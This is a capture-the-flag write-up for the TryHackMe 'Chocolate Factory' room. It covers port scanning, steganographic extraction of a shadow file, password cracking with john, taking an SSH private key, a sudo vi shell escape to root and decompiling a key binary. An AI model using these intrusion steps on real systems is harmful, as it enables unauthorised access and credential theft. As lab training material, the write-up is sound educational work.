```bash
# PLATFORM          . THM
# CTF NAME          . Chocolate Factory
# DESCRIPTION       . A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/chocolatefactory
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.6.249 -oN chocolate
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg

22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1631bbb51fcccc12148ff0d833b0089b (RSA)
|   256 e71fc9db3eaa44b672103ceedb1d3390 (ECDSA)
|_  256 b44502b6248ea9065f6c79448a06555e (ED25519)

80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
```

- All ports from 100-125 have the same banner, so I trimmed the output for readability. 

- `Mr.Wonka` and `Augustus` can be possible usernames, but let's take a look at the `FTP` service.

- It allows for anonymous login, and by doing so, we're able to gather `gum_room.jpg` file.

- This file appears to extract some hidden data that can be extracted using `steghide --extract -sf` ; the output will be encoded in `base64`, so we need to decode it

```
base64 -d b64.txt

daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6${REDACTED}bwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

- Alright, so we got the hash for `charlie`. 

- I ran john against this file for a little while using `rockyou.txt` and I got the password for `charlie`.

```
c{redacted}4           (charlie)    
```

- SSH wasn't working with these credentials, so I assumed these are the credentials needed to login on the login panel running on the webserver.

- By doing so, we get access to a prompt that can run commands in the OS.

- A simple `cd /home/charlie;ls` will reveal 2 files: `teleport` and `teleport.pub`.

- If we `cat teleport.pub`, we see that this is the public SSH key for charlie, so I assume teleport is the private one.

- Cat `teleport` and copy the output to a local file, then `chmod 600 <filename>`

- Now, we can SSH in to the box as user charlie: `ssh -i rsa_file charlie@ip`

```bash
sudo -l

(ALL : !root) NOPASSWD: /usr/bin/vi
```

- The privileges can be escalated using 

```
sudo /usr/bin/vi

<ESC>
:!/bin/bash
```

- Now we're root. The issue is that I have no clue where the flag is or how it is named. The only thing we have in `/root` is `root.py`

```bash
cat root.py 

from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

- So the program asks for a `key`, which then is used to decrypt the message hold in `encrypted_mess` variable. Then, this decrypted message is decoded and printed on the screen. 

- I assume that's the flag. But where's the key?

- I was thinking that since we already have the encrypted message, maybe we can do some tricks to get the flag without the key. But their doc page seems to destroy my only hope

```
Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key.
```

- I decided that if the key is somewhere on the server, the webserver might give me some clues.

- Inside `/var/www/html` we can find the `key_rev_key` binary, which, if we run `strings` on it, we can find the key

```
 congratulations you have found the key:   
b'-VkgXhF{REDACTED}hcGSQzY='
```

- However, I wanted to see the entire logic of the program, so I've started a python3 http server on the compromised machine and used `wget` to download the file.

- Then, I've decompiled it using `ghidra`.

- Here's the main function of the program.

```

undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter your name: ");
  __isoc99_scanf(&DAT_0010090a,local_38);
  iVar1 = strcmp(local_38,"laksdhfas");
  if (iVar1 == 0) {
    printf("\n congratulations you have found the key:   ");
    printf("b\'-VkgXhF{REDACTED}hcGSQzY=\'");
    printf("\n Keep its safe");
  }
  else {
    puts("Bad name!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

- When run, the program asks for a name. Anything other than `laksdhfas` as input is considered invalid and the program exits.

- Otherwise, the message found in `strings` is outputted.

- If we run `python /root/root.py` and input the `b'-VkgXhFf6s{redacted}6GSQzY='` key, we're getting the root flag.

- The user flag is in `/home/charlie/user.txt`.

